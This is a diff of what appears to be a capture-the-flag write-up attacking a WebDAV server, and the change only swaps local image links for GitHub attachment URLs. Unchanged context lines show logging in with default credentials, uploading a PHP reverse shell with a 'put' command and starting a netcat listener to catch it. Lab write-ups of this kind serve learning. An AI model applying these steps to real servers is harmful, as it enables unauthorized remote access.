@@ -20,7 +20,8 @@ PORT   STATE SERVICE
 /webdav               (Status: 401) [Size: 458]
 
 ```
-![alt text](image.png)
+![image](https://github.com/user-attachments/assets/7e2e7d65-a59c-46ef-b301-d9454c4daa95)
+
 
 - It requires username and password
 
@@ -130,7 +131,7 @@ Exploit target:
 ```
 - Here we find a default username and a password for webdav lets try it. Its worked!!
 
-![alt text](image-1.png)
+![image-1](https://github.com/user-attachments/assets/d73a4648-4f66-4893-81a1-b600f3b7d8b8)
 
 - Our php reverse shell has been attached there lets try it
 
@@ -162,7 +163,7 @@ dav:/webdav/> cat M5WDGB5.php
 directory.txt  hello.php   quick.py
                                      
 ```
-![alt text](image-2.png)
+![image-2](https://github.com/user-attachments/assets/ffc58da5-ca06-48f8-b309-4ddf5acb6b8d)
 ```sh
 dav:/webdav/> put hello.php 
 Uploading hello.php to `/webdav/hello.php':
@@ -171,7 +172,7 @@ dav:/webdav/>
 
 ```
 
-![alt text](image-3.png)
+![image-3](https://github.com/user-attachments/assets/1616ecd1-28c1-442a-b83f-d4f04c90a0fa)
 
 ```sh
 └─$ nc -nvlp 1234       
